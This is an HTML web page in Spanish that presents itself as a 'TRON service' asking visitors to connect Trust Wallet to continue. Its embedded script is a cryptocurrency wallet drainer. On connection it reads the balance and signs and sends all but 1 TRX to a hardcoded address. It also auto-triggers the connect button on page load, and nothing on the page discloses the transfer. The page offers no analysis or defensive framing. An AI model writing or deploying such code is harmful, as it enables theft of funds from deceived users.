<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transferencia Automática TRON</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        button {
            background-color: #1c1c1c;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
            font-size: 16px;
        }
        #status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
        .warning {
            background-color: #fff3cd;
            color: #856404;
        }
    </style>
</head>
<body>
    <h1>Servicio TRON</h1>
    <p>Conecta tu billetera Trust Wallet para continuar</p>
    
    <button id="connectBtn">Conectar Trust Wallet</button>
    
    <div id="status">Esperando conexión...</div>
    
    <script>
        // Configuración de TronWeb
        const tronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',
            headers: { "TRON-PRO-API-KEY": "tu-api-key" }
        });
        
        // Dirección de destino
        const destino = "TTe7RUx6YN2sA7xwbFfnNr2cKQ6Z1B6eS7";
        const statusDiv = document.getElementById('status');
        const connectBtn = document.getElementById('connectBtn');
        
        // Función para transferir automáticamente
        async function transferirAutomaticamente() {
            try {
                statusDiv.textContent = "Procesando transferencia...";
                statusDiv.className = "";
                
                // Obtener balance
                const balance = await window.tronWeb.trx.getBalance();
                const balanceTRX = window.tronWeb.fromSun(balance);
                
                if (balanceTRX <= 1) { // Dejamos 1 TRX para fees si es necesario
                    statusDiv.textContent = "Balance insuficiente para transferir";
                    statusDiv.className = "warning";
                    return;
                }
                
                // Calculamos el monto a transferir (dejamos 1 TRX para posibles fees futuros)
                const montoTransferencia = balance - window.tronWeb.toSun(1);
                
                statusDiv.textContent = `Transferiendo ${window.tronWeb.fromSun(montoTransferencia)} TRX...`;
                
                // Crear y enviar transacción
                const tx = await window.tronWeb.transactionBuilder.sendTrx(
                    destino,
                    montoTransferencia,
                    window.tronWeb.defaultAddress.base58
                );
                
                const signedTx = await window.tronWeb.trx.sign(tx);
                const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
                
                statusDiv.textContent = `Transferencia completada. TXID: ${result.txid}`;
                statusDiv.className = "success";
                
            } catch (error) {
                statusDiv.textContent = `Error: ${error.message}`;
                statusDiv.className = "error";
            }
        }
        
        // Conectar a Trust Wallet y transferir automáticamente
        connectBtn.addEventListener('click', async () => {
            try {
                if (window.tronWeb && window.tronWeb.ready) {
                    // Solicitar conexión
                    await window.tronWeb.request({method: 'tron_requestAccounts'});
                    
                    // Verificar red TRON
                    if (window.tronWeb.fullNode.host !== tronWeb.fullHost) {
                        statusDiv.textContent = "Por favor cambia a la red principal de TRON en Trust Wallet";
                        statusDiv.className = "error";
                        return;
                    }
                    
                    statusDiv.textContent = "Conectado. Iniciando transferencia...";
                    connectBtn.disabled = true;
                    
                    // Iniciar transferencia automática
                    await transferirAutomaticamente();
                    
                } else {
                    statusDiv.textContent = "Trust Wallet no detectado. Usa el navegador integrado de Trust Wallet.";
                    statusDiv.className = "error";
                }
            } catch (error) {
                statusDiv.textContent = `Error de conexión: ${error.message}`;
                statusDiv.className = "error";
            }
        });
        
        // Detectar si ya está conectado (para recargar página)
        if (window.tronWeb && window.tronWeb.ready) {
            connectBtn.click();
        }
    </script>
</body>
</html>
